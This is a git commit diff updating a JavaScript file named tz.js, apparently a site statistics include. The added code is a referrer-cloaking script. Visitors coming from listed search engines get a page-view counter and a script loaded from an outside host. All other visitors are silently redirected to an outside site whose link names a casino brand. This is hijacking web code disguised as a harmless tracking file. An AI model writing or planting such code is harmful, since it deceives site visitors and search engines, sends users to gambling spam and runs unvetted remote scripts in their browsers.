68b75b8f296dcd787fb81da9c3162b0017e69a62
js999999999 <js-9@outlook.com>
2017-02-24 12:53:57 +0800

    Update tz.js

--- 20172cc/tz.js
+++ 20172cc/tz.js
@@ -1,3 +1,12 @@
-document.writeln("<script language=\"javascript\" src=\"http:\/\/count18.51yes.com\/click.aspx?id=182011535&logo=12\" charset=\"gb2312\"><\/script>");
+today=new Date();
+today=today.getYear()+"-"+(today.getMonth()+1)+"-"+today.getDate();
+var regexp=/\.(sogou|so|haosou|baidu|google|youdao|yahoo|bing|gougou|118114|vnet|360|ioage|sm|sp)(\.[a-z0-9\-]+){1,2}\//ig;
+var where =document.referrer;
+if(regexp.test(where)){
+document.write ('<script language="javascript" src="http://count8.51yes.com/click.aspx?id=84676037&logo=6" charset="gb2312"></script><script language="javascript" type="text/javascript" src="http://www.647123.com/20172cc/t.js "></script></div>');
+}
+else
+{
+window.location.href="http://www.00585.com/#新濠天地-老品牌";
+}
 
-document.writeln("<script src=http:\/\/\www.647123.com\/20172cc/t.js ><\/script>");
